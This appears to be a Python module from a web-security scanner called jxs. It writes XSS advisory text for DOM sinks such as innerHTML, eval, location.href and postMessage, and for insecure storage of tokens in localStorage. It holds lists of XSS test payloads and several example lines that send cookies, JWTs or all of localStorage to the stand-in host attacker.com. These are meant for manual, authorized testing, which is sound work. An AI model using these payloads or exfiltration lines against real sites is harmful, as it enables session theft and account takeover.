"""
src/xss_advisor/advisor.py
XSS advisory text generator for jxs.

PRD 8c: XSS Advisor module reads findings with type='dom_sink' and generates
specific, actionable advisory text per sink type.

Rules:
  - Each DOM sink type gets a specific (non-generic) advisory
  - NO payload auto-fire — recommendations are manual testing steps only
  - Output saved to advisories table with context_snippet

PRD 8f Done Criteria: every dom_sink match produces 1 specific advisory text row.
"""

from __future__ import annotations

import json
import logging
from pathlib import Path

logger = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# PRD 8s — XSS Advisor Payload Dictionary
# Manual test payloads per sink type — TIDAK pernah auto-fire (PRD Non-Goals s.3)
# Setiap entry: context, sample_payloads, testing_steps, source_ref
# ─────────────────────────────────────────────────────────────────────────────
XSS_ADVISOR_PAYLOADS: dict[str, dict] = {
    "innerHTML": {
        "context": "HTML injection langsung ke DOM — browser akan parse dan render tag yang di-inject.",
        "sample_payloads": [
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
        ],
        "testing_steps": [
            "1. Trace sumber value yang di-assign ke innerHTML (DevTools → Sources → breakpoint).",
            "2. Jika source adalah URL param/hash: coba ?param=<img src=x onerror=alert(1)>.",
            "3. Cek apakah DOMPurify.sanitize() / innerHTML = escape() membungkus assignment.",
            "4. Jika lolos tanpa sanitasi → confirmed XSS, catat reproduction steps.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / innerHTML",
    },
    "outerHTML": {
        "context": "Mengganti seluruh elemen termasuk tag — impact lebih besar dari innerHTML karena bisa replace struktur DOM.",
        "sample_payloads": [
            "<svg onload=alert(document.domain)>",
            "<img src=x onerror=alert(1)>",
            "<iframe src=javascript:alert(1)>",
        ],
        "testing_steps": [
            "1. Trace value yang di-assign ke outerHTML.",
            "2. Inject payload via input vector yang teridentifikasi.",
            "3. Cek apakah elemen induk ikut ter-replace (signature khas outerHTML injection).",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / outerHTML",
    },
    "document.write": {
        "context": "Menulis langsung ke DOM saat parse — jika dipanggil setelah load, bisa overwrite seluruh halaman.",
        "sample_payloads": [
            "<img src=x onerror=alert(1)>",
            "</script><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
        ],
        "testing_steps": [
            "1. Set breakpoint di document.write(), observasi argumen di runtime.",
            "2. Jika argumen mengandung URL param/cookie: inject payload via param tersebut.",
            "3. Perhatikan apakah breakout dari script tag diperlukan (“</script><script>alert(1)”).",
            "4. Test di Chrome DAN Firefox — behavior berbeda untuk beberapa kasus.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / document.write",
    },
    "document.writeln": {
        "context": "Sama seperti document.write() tapi menambah newline — risk profile identik.",
        "sample_payloads": [
            "<img src=x onerror=alert(1)>",
            "</script><script>alert(1)</script>",
        ],
        "testing_steps": [
            "1. Treat identik dengan document.write() — lihat testing steps document.write.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / document.writeln",
    },
    "eval": {
        "context": "Eksekusi JavaScript string secara langsung — arbitrary code execution jika argumen user-controlled.",
        "sample_payloads": [
            "alert(document.domain)",
            "fetch('https://attacker.com?c='+document.cookie)",
            "'-alert(1)-'",
        ],
        "testing_steps": [
            "1. DevTools → Sources → breakpoint di eval(), observasi argumen.",
            "2. Jika argumen berasal dari URL/input: inject 'alert(1)' via input vector.",
            "3. Perhatikan quoting — sering perlu escape: \"'- atau \"\\x27-\" untuk break string.",
            "4. Vendor code yang pakai eval untuk dynamic require = Low priority.",
        ],
        "source_ref": "PayloadsAllTheThings — JavaScript Injection / eval",
    },
    "Function": {
        "context": "new Function() constructor — risk setara eval, eksekusi JS arbitrary.",
        "sample_payloads": [
            "alert(document.domain)",
            "alert(1)",
            "fetch('https://attacker.com?'+document.cookie)",
        ],
        "testing_steps": [
            "1. Breakpoint di new Function(), cek argumen string yang di-pass.",
            "2. Jika user-controlled: inject alert(document.domain) via input vector.",
            "3. Jika dalam template engine / code evaluator: eskalasi prioritas ke Critical.",
        ],
        "source_ref": "PayloadsAllTheThings — JavaScript Injection / new Function()",
    },
    "dangerouslySetInnerHTML": {
        "context": "React opt-in ke raw HTML rendering — eksplisit bypass React’s XSS protection.",
        "sample_payloads": [
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
        ],
        "testing_steps": [
            "1. Temukan komponen yang pakai dangerouslySetInnerHTML, trace __html value.",
            "2. Cek apakah DOMPurify.sanitize() wrapping value sebelum di-pass ke prop.",
            "3. Jika value dari API response / user input tanpa sanitasi: inject payload.",
            "4. Perhatikan komponen re-render — bisa trigger ulang saat state berubah.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / React dangerouslySetInnerHTML",
    },
    "insertAdjacentHTML": {
        "context": "Insert HTML string di posisi relatif terhadap elemen — posisi tidak mempengaruhi XSS risk.",
        "sample_payloads": [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(document.domain)>",
        ],
        "testing_steps": [
            "1. Trace argumen kedua (HTML string) — argumen pertama (position) tidak relevan.",
            "2. Inject payload via input vector yang mengontrol HTML string.",
            "3. Verify eksekusi di browser (check Network tab jika payload kirim request).",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / insertAdjacentHTML",
    },
    "setAttribute": {
        "context": "Set attribute HTML secara dinamis — berbahaya jika attribute name ATAU value user-controlled.",
        "sample_payloads": [
            "javascript:alert(document.domain)",  # untuk href / src
            "onerror=alert(1)",                    # jika attribute name user-controlled
            "\" onmouseover=\"alert(1)",            # injection ke dalam attribute value
        ],
        "testing_steps": [
            "1. Identify attribute name yang di-set — jika 'href'/'src': test javascript: URI.",
            "2. Jika attribute name user-controlled: test inject event handler (onmouseover=alert(1)).",
            "3. Jika attribute value adalah URL: test open redirect + javascript: URI.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / setAttribute",
    },
    "setAttributeNS": {
        "context": "setAttribute dengan namespace — biasa dipakai SVG/XML, risk sama dengan setAttribute.",
        "sample_payloads": [
            "javascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
        ],
        "testing_steps": [
            "1. Sama dengan setAttribute testing steps.",
            "2. Perhatikan context SVG — beberapa payload berbeda untuk SVG namespace.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection / setAttributeNS",
    },
    "location.href": {
        "context": "Redirect ke URL — open redirect dan XSS via javascript: URI jika value user-controlled.",
        "sample_payloads": [
            "javascript:alert(document.domain)",
            "//attacker.com",
            "https://attacker.com",
        ],
        "testing_steps": [
            "1. Trace value yang di-assign — cek apakah dari URL param/hash/referrer.",
            "2. Open redirect test: set value ke https://attacker.com, observe redirect.",
            "3. XSS test: set value ke javascript:alert(1) — works di beberapa browser.",
            "4. Prioritas tinggi jika di login/logout/OAuth callback flow.",
        ],
        "source_ref": "PayloadsAllTheThings — Open Redirect / javascript: URI",
    },
    "location.assign": {
        "context": "Navigation function, risk identik dengan location.href assignment.",
        "sample_payloads": [
            "javascript:alert(document.domain)",
            "//attacker.com",
        ],
        "testing_steps": [
            "1. Trace argumen — jika user-controlled: test open redirect dan javascript: URI.",
            "2. Common di auth flows — high priority jika dekat login/logout/oauth.",
        ],
        "source_ref": "PayloadsAllTheThings — Open Redirect",
    },
    "location.replace": {
        "context": "Seperti location.assign() tapi replace history entry. Risk identik.",
        "sample_payloads": [
            "javascript:alert(document.domain)",
            "//attacker.com",
        ],
        "testing_steps": [
            "1. Trace argumen. Test open redirect dan javascript: URI jika user-controlled.",
        ],
        "source_ref": "PayloadsAllTheThings — Open Redirect",
    },
    "window.open": {
        "context": "Buka URL di tab/window baru — open redirect dan XSS via javascript: URI.",
        "sample_payloads": [
            "javascript:alert(document.domain)",
            "//attacker.com",
            "data:text/html,<script>alert(1)</script>",
        ],
        "testing_steps": [
            "1. Trace argumen pertama (URL). Jika user-controlled: test javascript: URI.",
            "2. Check argumen kedua (target) — 'javascript:' sebagai target exploitable di beberapa browser.",
            "3. Common di popup/new-tab functionality.",
        ],
        "source_ref": "PayloadsAllTheThings — Open Redirect / XSS",
    },
    "postMessage": {
        "context": "Cross-origin communication — berbahaya jika receiver tidak validate origin dan langsung inject ke DOM.",
        "sample_payloads": [
            "<img src=x onerror=alert(document.domain)>",
            "javascript:alert(1)",
        ],
        "testing_steps": [
            "1. Cari event listener 'message' di kode — cek apakah origin divalidasi (e.origin === window.location.origin).",
            "2. Jika tidak divalidasi: buka halaman di iframe, kirim postMessage dari parent.",
            "3. Test: window.frames[0].postMessage('<img src=x onerror=alert(1)>', '*')",
            "4. Cek apakah data dari event.data langsung masuk ke innerHTML/eval.",
        ],
        "source_ref": "PayloadsAllTheThings — postMessage Vulnerabilities",
    },
    "localStorage": {
        "context": "Baca dari localStorage — persistent XSS jika data dari storage langsung masuk ke sink DOM tanpa sanitasi.",
        "sample_payloads": [
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
        ],
        "testing_steps": [
            "1. Set nilai di localStorage manual: localStorage.setItem('key', '<img src=x onerror=alert(1)>').",
            "2. Reload halaman — observe apakah payload ter-render di DOM.",
            "3. Cek apakah nilai dari storage dipakai langsung di innerHTML/document.write.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection",
    },
    "fetch": {
        "context": "HTTP request dari browser — worth tracking sebagai endpoint discovery, bukan direct XSS sink.",
        "sample_payloads": [],
        "testing_steps": [
            "1. Observe URL yang di-fetch — catat sebagai endpoint candidate.",
            "2. Cek apakah response dari fetch langsung masuk ke DOM sink (innerHTML, dll).",
            "3. Jika ya: test XSS via response manipulation (MITM atau controlled server response).",
        ],
        "source_ref": "Endpoint discovery — bukan direct XSS sink",
    },

    # PRD 8w — Insecure Storage types
    # Payload bukan XSS injection, melainkan DevTools console commands untuk demonstrate exfil
    # karena storage findings butuh XSS sebagai precondition untuk actual exploit.
    "storage_jwt": {
        "context": "JWT token literal tersimpan di localStorage/sessionStorage — exfiltrable via XSS.",
        "sample_payloads": [
            "fetch('https://attacker.com?t='+localStorage.getItem('token'))",
            "new Image().src='https://attacker.com?jwt='+localStorage.getItem('auth_token')",
        ],
        "testing_steps": [
            "1. DevTools → Application → Storage → Local Storage → cari key yang match, lihat value aktual.",
            "2. Decode JWT di jwt.io — cek apakah ini auth/session token atau innocuous state param.",
            "3. Jika auth token: cari XSS vector di origin yang sama untuk demonstrasi full exfil.",
            "4. Cek mitigasi: apakah HttpOnly cookie juga dipakai? Kalau iya, localStorage mungkin legacy/redundant.",
            "5. Console test (jika ada XSS): jalankan payload di atas untuk konfirmasi exfil.",
        ],
        "source_ref": "PRD 8w — Insecure Storage Detection",
    },
    "storage_set": {
        "context": "localStorage.setItem() dengan key name mengandung kata sensitif — perlu konfirmasi value.",
        "sample_payloads": [
            "fetch('https://attacker.com?d='+JSON.stringify(localStorage))",
            "Object.keys(localStorage).map(k=>console.log(k,localStorage.getItem(k)))",
        ],
        "testing_steps": [
            "1. DevTools → Application → Storage → Local Storage → inspect value aktual saat runtime.",
            "2. Apakah value berupa credential nyata, atau CSRF token / state param yang aman?",
            "3. CSRF token / state param OAuth → review_status = checked_benign.",
            "4. Credential nyata → cari XSS vector di origin yang sama → demonstrate exfil.",
            "5. FP note: key name match saja, value TIDAK diverifikasi otomatis oleh jxs.",
        ],
        "source_ref": "PRD 8w — Insecure Storage Detection",
    },
    "storage_get": {
        "context": "localStorage.getItem() dengan key sensitif — evidence konsumsi, perlu trace ke mana value dipakai.",
        "sample_payloads": [],  # LOW severity — tidak perlu payload, cukup manual trace
        "testing_steps": [
            "1. DevTools → Sources → set breakpoint di baris getItem ini.",
            "2. Trigger flow yang memanggil kode ini (login, load page, dll).",
            "3. Observe return value dan lihat call stack — trace ke mana value dipakai.",
            "4. Jika value dikirim ke Authorization header → upgrade risk ke high chain finding.",
            "5. Jika value hanya dipakai untuk display/UI → review_status = checked_benign.",
        ],
        "source_ref": "PRD 8w — Insecure Storage Detection (chainability out of scope, perlu manual trace)",
    },
}

# Advisory templates — satu per sink type keyword
# These are specific, actionable, dan exploit-free (PRD 8c).
# ─────────────────────────────────────────────────────────────────────────────
SINK_ADVISORIES: dict[str, str] = {
    "innerHTML": (
        "innerHTML sink detected. If the assigned value derives from URL parameters, "
        "user input, or server-controlled data, test for reflected/stored XSS. "
        "Manual step: trace the data source (right-click → 'Go to definition' in DevTools). "
        "If source is user-controlled, craft a PoC: assign <img src=x onerror=alert(1)> "
        "via the relevant input vector and observe execution. "
        "Mitigation check: look for DOMPurify.sanitize() wrapping the assignment."
    ),
    "outerHTML": (
        "outerHTML sink detected. Similar risk to innerHTML — replaces the entire element "
        "including tag. Trace the assigned value's origin. If user-controlled, test with "
        "<svg onload=alert(1)> as input. Higher impact than innerHTML because it can "
        "replace structural elements. Check for sanitization before assignment."
    ),
    "document.write": (
        "document.write() sink detected. Particularly dangerous when called after page load "
        "(can overwrite entire DOM). Trace the argument — if URL/cookie/user-controlled, "
        "test with: document.write('&lt;img src=x onerror=alert(1)&gt;'). "
        "Note: modern browsers block some document.write injections, but not all. "
        "Test in both Chrome and Firefox. Check if this is in a vendor file (lower priority)."
    ),
    "document.writeln": (
        "document.writeln() sink detected. Same risk profile as document.write() — "
        "adds a newline after writing. Treat identically to document.write findings. "
        "Trace argument source and test if user-controlled."
    ),
    "eval": (
        "eval() sink detected. If the argument includes any user-controlled or externally-sourced "
        "string, this is a critical JavaScript injection vector (not just XSS — arbitrary JS execution). "
        "Manual step: set a breakpoint on eval() in DevTools, observe the argument at runtime. "
        "Test by injecting alert(1) via the argument source. "
        "Note: minified vendor code often uses eval for dynamic requires — classify as Low if vendor."
    ),
    "Function": (
        "Function() constructor detected (equivalent risk to eval). Can execute arbitrary JS "
        "if argument is user-controlled. Example: new Function('alert(1)')() executes immediately. "
        "Set DevTools breakpoint, trace argument source. "
        "If used in a template engine or code runner, escalate priority."
    ),
    "dangerouslySetInnerHTML": (
        "React dangerouslySetInnerHTML prop detected. This is React's explicit opt-in to raw HTML rendering. "
        "Check if the __html value is sanitized (DOMPurify.sanitize) before being passed. "
        "If the value comes from props, state, or API response without sanitization, test for XSS. "
        "Manual step: search for the component usage in the codebase, trace __html value origin."
    ),
    "insertAdjacentHTML": (
        "insertAdjacentHTML() sink detected. Inserts HTML string at a specified position relative to element. "
        "Second argument is the HTML string — trace its origin. "
        "If user-controlled: test with '<img src=x onerror=alert(1)>' as the second argument. "
        "Position argument ('beforebegin', 'afterbegin', etc.) does not affect XSS risk."
    ),
    "setAttributeNS": (
        "setAttributeNS() detected. Can set dangerous attributes like href='javascript:void(0)' "
        "or event handlers (onclick, onmouseover). If attribute name or value is user-controlled, "
        "test by injecting javascript:alert(1) as href value or an event handler payload. "
        "Also check if this sets src attribute on script/img elements."
    ),
    "setAttribute": (
        "setAttribute() detected. Can set dangerous attributes (href, src, on* handlers). "
        "If either the attribute name or value is derived from user input, test for XSS via "
        "javascript: URI in href, or event handler injection. "
        "Common in dynamic link generation — check if URL construction is validated."
    ),
    "location.href": (
        "location.href assignment detected (open redirect / XSS via javascript: URI). "
        "If the assigned URL is user-controlled (URL param, hash, referrer), test for: "
        "(1) Open redirect: set location.href to https://attacker.com — check if validated. "
        "(2) XSS: set location.href to javascript:alert(1) — works in some contexts. "
        "Prioritize if this is in a login redirect or OAuth callback flow."
    ),
    "location.assign": (
        "location.assign() detected (navigation function, same risk as location.href assignment). "
        "If argument is user-controlled, test for open redirect and javascript: URI injection. "
        "Common in auth flows — high priority if near login/logout/oauth code."
    ),
    "location.replace": (
        "location.replace() detected. Same risk profile as location.assign() but replaces history entry. "
        "Trace the argument source — if user-controlled, test for open redirect and XSS. "
        "Less common than location.href but equally dangerous if unsanitized."
    ),
    "window.open": (
        "window.open() detected. First argument is URL — if user-controlled, test for: "
        "(1) Open redirect: window.open('https://attacker.com'). "
        "(2) XSS via javascript: URI: window.open('javascript:alert(1)'). "
        "Also check the target parameter (second arg) — 'javascript:' as target can be exploited "
        "in some browser versions. Common in popup/new-tab functionality."
    ),
    # PRD 8w — Insecure Storage types
    "storage_jwt": (
        "JWT token stored directly in localStorage/sessionStorage as a literal value. "
        "This is HIGH severity because: if an XSS vulnerability exists anywhere on this origin, "
        "an attacker can call localStorage.getItem() to exfiltrate the token, then impersonate the user. "
        "Manual steps: (1) Open DevTools → Application → Storage → Local Storage → confirm the JWT is still there. "
        "(2) Decode the JWT (jwt.io) — check claims: is this an auth/session token or an innocuous state param? "
        "(3) If auth token: look for any XSS vector on the same origin to demonstrate full impact. "
        "(4) Mitigation check: is HttpOnly cookie used instead? If yes, this storage may be redundant/legacy."
    ),
    "storage_set": (
        "Potentially sensitive data stored in localStorage/sessionStorage with a key name matching "
        "a sensitive keyword (token, auth, password, secret, credential, api_key, session). "
        "Risk: if XSS exists, attacker can exfiltrate stored value via localStorage.getItem(). "
        "Manual steps: (1) DevTools → Application → Storage → inspect actual stored value at runtime. "
        "(2) Is the value a real credential/token or a non-sensitive ID? CSRF tokens and state params are acceptable. "
        "(3) If credential: find any XSS vector on the same origin to show exfil impact. "
        "FP note: key name match only, value is NOT verified — confirm before escalating."
    ),
    "storage_get": (
        "Credential key read from localStorage/sessionStorage (getItem with sensitive key name). "
        "This is LOW/INFO severity by itself — it shows where sensitive storage is consumed, "
        "not where it is stored. Worth tracking for two reasons: (1) confirms the key is actively used "
        "(not just written and forgotten); (2) trace where the value goes next — if it becomes an "
        "Authorization header, XSS impact escalates to full token exfil. "
        "Manual step: in DevTools Sources, set a breakpoint on this getItem call, observe the return value "
        "and trace its usage in the call stack. If value goes to a fetch() Authorization header, note the chain."
    ),
}

# Generic fallback for unrecognized sink types
_GENERIC_ADVISORY = (
    "DOM manipulation sink detected. Trace the data source to determine if user-controlled input "
    "reaches this sink without sanitization. If so, test for XSS manually by injecting "
    "<img src=x onerror=alert(1)> or equivalent payload via the identified input vector."
)

_GENERIC_PAYLOADS = [
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "javascript:alert(document.domain)",
]


def _normalize_sink(match_value: str) -> str:
    """Extract the sink keyword from a match_value for advisory lookup."""
    mv = match_value.strip().lower()
    for key in SINK_ADVISORIES:
        if mv.startswith(key.lower()):
            return key
    for key in SINK_ADVISORIES:
        if key.lower() in mv:
            return key
    return ""


def get_payloads_for_sink(match_value: str) -> dict:
    """
    PRD 8s — Return payload dict for a given sink match_value.

    Returns:
        Dict with keys: context, sample_payloads, testing_steps, source_ref
        Falls back to generic payloads if sink not in XSS_ADVISOR_PAYLOADS.
    """
    normalized = _normalize_sink(match_value)
    if normalized in XSS_ADVISOR_PAYLOADS:
        return XSS_ADVISOR_PAYLOADS[normalized]
    return {
        "context": "DOM manipulation sink — trace data source.",
        "sample_payloads": _GENERIC_PAYLOADS,
        "testing_steps": [
            "Trace nilai yang masuk ke sink.",
            "Jika user-controlled: inject <img src=x onerror=alert(document.domain)> via input vector.",
            "Cek sanitasi: DOMPurify.sanitize() atau escape function.",
        ],
        "source_ref": "PayloadsAllTheThings — XSS Injection",
    }


def generate_advisory(sink_type: str, match_value: str, context_snippet: str = "") -> str:
    """
    Generate a specific advisory text for a given DOM sink.
    Returns advisory text string (str) for backward compatibility.
    """
    normalized = _normalize_sink(match_value)
    return SINK_ADVISORIES.get(normalized, _GENERIC_ADVISORY)


def generate_advisory_full(sink_type: str, match_value: str, context_snippet: str = "") -> dict:
    """
    PRD 8s — Return full advisory dict including payloads + testing steps.

    Returns dict:
        advisory_text   : str (narrative)
        sample_payloads : list[str]
        testing_steps   : list[str]
        source_ref      : str
        context         : str
    """
    normalized = _normalize_sink(match_value)
    text = SINK_ADVISORIES.get(normalized, _GENERIC_ADVISORY)
    payload_data = get_payloads_for_sink(match_value)
    
    # Handle the difference in structure for storage vs sink entries
    if isinstance(payload_data, str): # fallback
        return {
            "advisory_text": text,
            "sample_payloads": _GENERIC_PAYLOADS,
            "testing_steps": ["Trace data flow."],
            "source_ref": "N/A",
            "context": "N/A"
        }
        
    return {
        "advisory_text":   text,
        "sample_payloads": payload_data.get("sample_payloads", _GENERIC_PAYLOADS),
        "testing_steps":   payload_data.get("testing_steps", []),
        "source_ref":      payload_data.get("source_ref", "N/A"),
        "context":         payload_data.get("context", "N/A"),
    }


def run_xss_advisor(
    scope: str | None = None,
    db_path=None,
) -> dict:
    """
    Generate advisories for all advisable findings in DB.
    PRD 8s: stores sample_payloads as JSON in advisories.sample_payloads column.
    PRD 8w: extended to cover storage_jwt, storage_set, storage_get in addition to dom_sink.
    """
    from src.db.schema import DEFAULT_DB_PATH, get_connection, init_db

    if db_path is None:
        db_path = DEFAULT_DB_PATH

    init_db(db_path)
    conn = get_connection(db_path)

    # Finding types that get advisor treatment
    _ADVISABLE_TYPES = (
        "dom_sink", "new_function", "attr_sink", "navigation_sink",
        "storage_jwt", "storage_set", "storage_get",
    )
    _type_placeholders = ",".join("?" * len(_ADVISABLE_TYPES))

    try:
        query = f"""
            SELECT f.id, f.type, f.match_value, f.snippet, f.js_file_id, js.scope
            FROM findings f
            JOIN js_files js ON js.id = f.js_file_id
            WHERE f.type IN ({_type_placeholders})
              AND f.id NOT IN (SELECT finding_id FROM advisories)
              AND f.is_whitelisted = 0
        """
        params: list = list(_ADVISABLE_TYPES)
        if scope:
            query += " AND js.scope = ?"
            params.append(scope)

        rows = conn.execute(query, params).fetchall()
        logger.info("XSS Advisor: %d new advisable findings to process", len(rows))

        created = 0
        for row in rows:
            full = generate_advisory_full(
                sink_type=row["type"],
                match_value=row["type"],   # use type directly as key — 'storage_jwt' etc lookup
                context_snippet=row["snippet"] or "",
            )
            try:
                conn.execute(
                    """
                    INSERT INTO advisories
                        (finding_id, sink_type, advisory_text, context_snippet, sample_payloads)
                    VALUES (?, ?, ?, ?, ?)
                    """,
                    (
                        row["id"],
                        row["match_value"],
                        full["advisory_text"],
                        row["snippet"],
                        json.dumps(full["sample_payloads"]),  # JSON string
                    ),
                )
                created += 1
            except Exception as exc:  # pylint: disable=broad-except
                # Fallback: insert tanpa sample_payloads jika kolom belum ada
                try:
                    conn.execute(
                        """
                        INSERT INTO advisories (finding_id, sink_type, advisory_text, context_snippet)
                        VALUES (?, ?, ?, ?)
                        """,
                        (row["id"], row["match_value"], full["advisory_text"], row["snippet"]),
                    )
                    created += 1
                except Exception as exc2:
                    logger.error("Advisory insert failed for finding_id=%d: %s", row["id"], exc2)

        conn.commit()
        summary = {"advisories_created": created, "findings_processed": len(rows)}
        logger.info("XSS Advisor complete: %s", summary)
        return summary

    finally:
        conn.close()
